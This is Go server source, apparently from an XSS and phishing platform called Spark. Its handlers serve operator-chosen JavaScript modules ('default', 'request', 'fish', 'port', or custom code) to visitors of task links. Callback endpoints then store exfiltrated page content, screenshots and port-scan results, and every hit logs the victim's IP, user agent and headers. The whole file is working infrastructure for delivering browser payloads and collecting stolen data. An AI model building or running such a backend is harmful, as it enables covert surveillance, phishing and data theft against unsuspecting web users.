package fishpage

import (
	"Spark/server/config"
	lib "Spark/server/lib/func"
	sqli "Spark/server/lib/sql"
	publicModule2 "Spark/server/module/public"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

func Fishpage(ctx *gin.Context) {

	fishApi := ctx.Param("fishapi")
	decodedFishApi, err := base64.StdEncoding.DecodeString(fishApi)
	if err != nil {
		// 处理解码错误
		fmt.Println("解码Base64错误:", err)
		return
	}

	taskID, err := strconv.ParseInt(string(decodedFishApi), 10, 64)
	if err != nil {
		// 处理转换错误
		fmt.Println("转换错误:", err)
		return
	}
	taskIDStr := strconv.FormatInt(taskID, 10)
	/*
		SQL
	*/
	// Connect
	thisSql := &sqli.Sql{}
	thisSql.Connect()
	defer thisSql.Close()

	r, _ := thisSql.Query(
		"appTasks",
		[]string{"*"},
		[]string{"taskID"},
		[]string{taskIDStr},
		" AND ",
		"",
	)

	if len(r) != 1 || r[0]["taskStatus"].(int64) != 1 {

		ctx.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	moduleID := r[0]["taskModuleID"].(int64)
	moduleType := r[0]["taskModulePublic"].(int64)

	if moduleType != 1 {

		func_api_customApi(ctx, taskID, moduleID)

	} else {

		func_api_publicApi(ctx, taskID, moduleID)

	}

}

func pages_api_secondLink(c *gin.Context) {

	taskApi := c.Param("taskApi")
	randStr := c.Param("randStr")
	reResult := c.DefaultQuery("result", "")
	reJson := make(map[string]string)
	paramJson := make(map[string]string)
	emailData := make(map[string]string)

	err := json.Unmarshal([]byte(reResult), &reJson)

	if err != nil {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	if !lib.CheckRandomStr(randStr) {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	/*
		SQL
	*/
	// Connect
	thisSql := &sqli.Sql{}
	thisSql.Connect()
	defer thisSql.Close()

	// Get task data

	r, _ := thisSql.Query(
		"appTasks",
		[]string{"taskID", "taskModuleID", "taskUserID", "taskModulePublic", "taskParams"},
		[]string{"taskApi"},
		[]string{taskApi},
		" AND ",
		"",
	)

	if len(r) != 1 || r[0]["taskModulePublic"].(int64) != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

	err = json.Unmarshal([]byte(r[0]["taskParams"].(string)), &paramJson)

	if err != nil {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	if lib.VerifyBooleanType(paramJson["webPage"]) {

		emailData["webPage"] = reJson["webPage"]

	}
	if lib.VerifyBooleanType(paramJson["screenShot"]) {

		emailData["screenShot"] = reJson["screenShot"]

	}

	if len(emailData) > 0 {

		// Get user data
		rts, _ := thisSql.Query(
			"userLogin",
			[]string{"userName", "userEmail"},
			[]string{"userID"},
			[]string{strconv.FormatInt(r[0]["taskUserID"].(int64), 10)},
			" AND ",
			"",
		)

		if len(rts) != 1 {

			c.String(
				http.StatusNotFound,
				"",
			)
			return

		}

	}

	// record
	getIP := c.ClientIP()
	getMethod := c.Request.Method
	getTime := lib.GetTimeDateTime()
	getAgent := c.Request.UserAgent()
	getHeaders := c.Request.Header
	jsonData, _ := json.Marshal(map[string]interface{}{

		"ip":      getIP,
		"method":  getMethod,
		"time":    getTime,
		"agent":   getAgent,
		"headers": getHeaders,
	})

	// insert

	reJson["webPage"] = ""
	reJson["screenShot"] = ""
	insertResult, err := json.Marshal(reJson)

	if err != nil {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	rt, _ := thisSql.Insert(
		"appTaskView",
		[]string{"recordID", "taskID", "moduleID", "userID", "modulePublic", "getMethod", "getIP", "getResult", "getModuleResult", "getTime"},
		[]string{
			"0",
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModuleID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModulePublic"].(int64), 10),
			getMethod,
			getIP,
			string(jsonData),
			string(insertResult),
			lib.GetTimeDateTime(),
		},
		"",
	)

	if rt != 1 {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	// update

	rts, _ := thisSql.Query(
		"appTaskView",
		[]string{"recordID"},
		[]string{"taskID", "moduleID", "userID"},
		[]string{
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModuleID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
		},
		" AND ",
		"",
	)

	recordCount := len(rts)

	rtss, _ := thisSql.Update(
		"appTasks",
		[]string{"taskRecordNum"},
		[]string{strconv.Itoa(recordCount)},
		[]string{"taskID", "taskUserID"},
		[]string{
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
		},
		" AND ",
		"",
	)

	if rtss != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

}

func pages_api_portLink(c *gin.Context) {

	taskApi := c.Param("taskApi")
	randStr := c.Param("randStr")
	reResult := c.DefaultQuery("result", "")
	reJson := make(map[string]string)

	err := json.Unmarshal([]byte(reResult), &reJson)

	if err != nil {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	if !lib.CheckRandomStr(randStr) {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	/*
		SQL
	*/
	// Connect
	thisSql := &sqli.Sql{}
	thisSql.Connect()
	defer thisSql.Close()

	// Get task data

	r, _ := thisSql.Query(
		"appTasks",
		[]string{"taskID", "taskModuleID", "taskUserID", "taskModulePublic", "taskParams"},
		[]string{"taskApi"},
		[]string{taskApi},
		" AND ",
		"",
	)

	if len(r) != 1 || r[0]["taskModulePublic"].(int64) != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

	// record
	getIP := c.ClientIP()
	getMethod := c.Request.Method
	getTime := lib.GetTimeDateTime()
	getAgent := c.Request.UserAgent()
	getHeaders := c.Request.Header
	jsonData, _ := json.Marshal(map[string]interface{}{

		"ip":      getIP,
		"method":  getMethod,
		"time":    getTime,
		"agent":   getAgent,
		"headers": getHeaders,
	})

	// insert

	rt, _ := thisSql.Insert(
		"appTaskView",
		[]string{"recordID", "taskID", "moduleID", "userID", "modulePublic", "getMethod", "getIP", "getResult", "getModuleResult", "getTime"},
		[]string{
			"0",
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModuleID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModulePublic"].(int64), 10),
			getMethod,
			getIP,
			string(jsonData),
			reResult,
			lib.GetTimeDateTime(),
		},
		"",
	)

	if rt != 1 {
		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	// update

	rts, _ := thisSql.Query(
		"appTaskView",
		[]string{"recordID"},
		[]string{"taskID", "moduleID", "userID"},
		[]string{
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskModuleID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
		},
		" AND ",
		"",
	)

	recordCount := len(rts)

	rtss, _ := thisSql.Update(
		"appTasks",
		[]string{"taskRecordNum"},
		[]string{strconv.Itoa(recordCount)},
		[]string{"taskID", "taskUserID"},
		[]string{
			strconv.FormatInt(r[0]["taskID"].(int64), 10),
			strconv.FormatInt(r[0]["taskUserID"].(int64), 10),
		},
		" AND ",
		"",
	)

	if rtss != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

}

func func_api_customApi(c *gin.Context, taskID, moduleID int64) {

	/*
		SQL
	*/
	// Connect
	thisSql := &sqli.Sql{}
	thisSql.Connect()
	defer thisSql.Close()

	// Get module data

	r, _ := thisSql.Query(
		"userModule",
		[]string{"*"},
		[]string{"moduleID"},
		[]string{
			strconv.FormatInt(moduleID, 10),
		},
		" AND ",
		"",
	)

	if len(r) != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	returnJS := r[0]["moduleCode"].(string)

	// record
	getIP := c.ClientIP()
	getMethod := c.Request.Method
	getTime := lib.GetTimeDateTime()
	getAgent := c.Request.UserAgent()
	getHeaders := c.Request.Header

	jsonData, _ := json.Marshal(map[string]interface{}{

		"ip":      getIP,
		"method":  getMethod,
		"time":    getTime,
		"agent":   getAgent,
		"headers": getHeaders,
	})

	// insert
	rt, _ := thisSql.Insert(
		"appTaskView",
		[]string{"recordID", "taskID", "moduleID", "modulePublic", "getMethod", "getIP", "getResult", "getModuleResult", "getTime"},
		[]string{
			"0",
			strconv.FormatInt(taskID, 10),
			strconv.FormatInt(moduleID, 10),
			"0",
			getMethod,
			getIP,
			string(jsonData),
			"",
			getTime,
		},
		"",
	)

	if rt != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

	// update
	rts, _ := thisSql.Query(
		"appTaskView",
		[]string{"*"},
		[]string{"taskID", "moduleID"},
		[]string{
			strconv.FormatInt(taskID, 10),
			strconv.FormatInt(moduleID, 10),
		},
		" AND ",
		"",
	)

	recordCount := len(rts)

	rtss, _ := thisSql.Update(
		"appTasks",
		[]string{"taskRecordNum"},
		[]string{strconv.Itoa(recordCount)},
		[]string{"taskID", "taskModuleID"},
		[]string{
			strconv.FormatInt(taskID, 10),
			strconv.FormatInt(moduleID, 10),
		},
		" AND ",
		"",
	)

	if rtss != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return

	}

	c.String(
		http.StatusOK,
		returnJS,
	)
}

func func_api_publicApi(c *gin.Context, taskID, moduleID int64) {

	/*
		SQL
	*/
	// Connect
	thisSql := &sqli.Sql{}
	thisSql.Connect()
	defer thisSql.Close()

	// Get module data

	r, _ := thisSql.Query(
		"appModule",
		[]string{"*"},
		[]string{"moduleID"},
		[]string{
			strconv.FormatInt(moduleID, 10),
		},
		" AND ",
		"",
	)

	if len(r) != 1 {

		c.String(
			http.StatusNotFound,
			"",
		)
		return
	}

	switch r[0]["moduleName"] {

	case publicModule2.AllPublicModuleName["default"]:

		// Get task params

		rt, _ := thisSql.Query(
			"appTasks",
			[]string{"*"},
			[]string{"taskID", "taskModuleID"},
			[]string{

				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if len(rt) != 1 {
			c.String(
				http.StatusNotFound,
				"",
			)
			return
		}

		secondApi := fmt.Sprintf(config.Config.Domain, c.Param("taskApi")) + "/default/" + lib.GetRandStr(12, "") + "?result="

		c.String(
			http.StatusOK,
			publicModule2.Module_default_js+fmt.Sprintf(publicModule2.Module_default_invoke, rt[0]["taskParams"].(string), secondApi),
		)

	case publicModule2.AllPublicModuleName["request"]:

		// Get task params

		rt, _ := thisSql.Query(
			"appTasks",
			[]string{"*"},
			[]string{"taskID", "taskModuleID"},
			[]string{

				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if len(rt) != 1 {
			c.String(
				http.StatusNotFound,
				"",
			)
			return
		}

		// record
		getIP := c.ClientIP()
		getMethod := c.Request.Method
		getTime := lib.GetTimeDateTime()
		getAgent := c.Request.UserAgent()
		getHeaders := c.Request.Header

		jsonData, _ := json.Marshal(map[string]interface{}{

			"ip":      getIP,
			"method":  getMethod,
			"time":    getTime,
			"agent":   getAgent,
			"headers": getHeaders,
		})

		// insert
		rts, _ := thisSql.Insert(
			"appTaskView",
			[]string{"recordID", "taskID", "moduleID", "modulePublic", "getMethod", "getIP", "getResult", "getModuleResult", "getTime"},
			[]string{
				"0",
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
				"0",
				getMethod,
				getIP,
				string(jsonData),
				"",
				getTime,
			},
			"",
		)

		if rts != 1 {

			c.String(
				http.StatusNotFound,
				"",
			)
			return

		}

		// update
		rtss, _ := thisSql.Query(
			"appTaskView",
			[]string{"*"},
			[]string{"taskID", "moduleID"},
			[]string{
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		recordCount := len(rtss)

		rtsss, _ := thisSql.Update(
			"appTasks",
			[]string{"taskRecordNum"},
			[]string{strconv.Itoa(recordCount)},
			[]string{"taskID", "taskModuleID"},
			[]string{
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if rtsss != 1 {

			c.String(
				http.StatusNotFound,
				"",
			)
			return

		}

		params := rt[0]["taskParams"].(string)
		fileNames := strings.Split(rt[0]["filePath"].(string), "|")
		jsonData2 := make(map[string]interface{})
		json.Unmarshal([]byte(params), &jsonData2)

		jsonGET := jsonData2["RequestGET"].(string)
		jsonPOST := jsonData2["RequestPOST"].(string)
		rUrl := jsonData2["RequestUrl"].(string)
		jsonFile := make(map[string]string)

		js := ""

		for _, each := range fileNames {

			f, err := os.Open(each)
			if err != nil {
				continue
			}

			r, err := ioutil.ReadAll(f)
			if err != nil {
				continue
			}

			fileName := strings.Split(filepath.Base(each), "_")[1]
			jsonFile[fileName] = url.QueryEscape(string(r))

		}

		jsonFILE, _ := json.Marshal(jsonFile)

		js += publicModule2.Module_request_js
		js += fmt.Sprintf(publicModule2.Module_request_invoke, jsonGET, jsonPOST, string(jsonFILE), rUrl)

		c.String(
			http.StatusOK,
			js,
		)

	case publicModule2.AllPublicModuleName["fish"]:

		// Get task params

		rt, _ := thisSql.Query(
			"appTasks",
			[]string{"*"},
			[]string{"taskID", "taskModuleID"},
			[]string{

				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if len(rt) != 1 {
			c.String(
				http.StatusNotFound,
				"",
			)
			return
		}

		// record
		getIP := c.ClientIP()
		getMethod := c.Request.Method
		getTime := lib.GetTimeDateTime()
		getAgent := c.Request.UserAgent()
		getHeaders := c.Request.Header

		jsonData, _ := json.Marshal(map[string]interface{}{

			"ip":      getIP,
			"method":  getMethod,
			"time":    getTime,
			"agent":   getAgent,
			"headers": getHeaders,
		})

		// insert
		rts, _ := thisSql.Insert(
			"appTaskView",
			[]string{"recordID", "taskID", "moduleID", "modulePublic", "getMethod", "getIP", "getResult", "getModuleResult", "getTime"},
			[]string{
				"0",
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
				"0",
				getMethod,
				getIP,
				string(jsonData),
				"",
				getTime,
			},
			"",
		)

		if rts != 1 {

			c.String(
				http.StatusNotFound,
				"",
			)
			return

		}

		// update
		rtss, _ := thisSql.Query(
			"appTaskView",
			[]string{"*"},
			[]string{"taskID", "moduleID"},
			[]string{
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		recordCount := len(rtss)

		rtsss, _ := thisSql.Update(
			"appTasks",
			[]string{"taskRecordNum"},
			[]string{strconv.Itoa(recordCount)},
			[]string{"taskID", "taskModuleID"},
			[]string{
				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if rtsss != 1 {

			c.String(
				http.StatusNotFound,
				"",
			)
			return

		}

		params := rt[0]["taskParams"].(string)
		jsonData2 := make(map[string]interface{})
		json.Unmarshal([]byte(params), &jsonData2)
		filePath := rt[0]["filePath"].(string)
		fileName := jsonData2["fishFILE"].(string)
		rUrl := jsonData2["fishUrl"].(string)

		content := ""
		js := ""

		if rUrl != "" && fileName == "" {

		}
		if filePath != "" {
			f, err := os.Open(filePath)
			if err != nil {
			}
			c, _ := ioutil.ReadAll(f)
			content = url.QueryEscape(string(c))
		}

		js += publicModule2.Module_fish_js
		js += fmt.Sprintf(publicModule2.Module_fish_js3, fileName, content)
		js += publicModule2.Module_fish_js2

		jsParams, _ := json.Marshal(rUrl)

		js += fmt.Sprintf(publicModule2.Module_fish_invoke, string(jsParams))

		c.String(
			http.StatusOK,
			js,
		)

	case publicModule2.AllPublicModuleName["port"]:

		// Get task params

		rt, _ := thisSql.Query(
			"appTasks",
			[]string{"*"},
			[]string{"taskID", "taskModuleID"},
			[]string{

				strconv.FormatInt(taskID, 10),
				strconv.FormatInt(moduleID, 10),
			},
			" AND ",
			"",
		)

		if len(rt) != 1 {
			c.String(
				http.StatusNotFound,
				"",
			)
			return
		}

		secondApi := fmt.Sprintf(config.Config.Domain, c.Param("taskApi")) + "/port/" + lib.GetRandStr(12, "") + "?result="

		c.String(
			http.StatusOK,
			publicModule2.Module_port_js+fmt.Sprintf(publicModule2.Module_port_invoke, rt[0]["taskParams"].(string), secondApi),
		)

	}

}
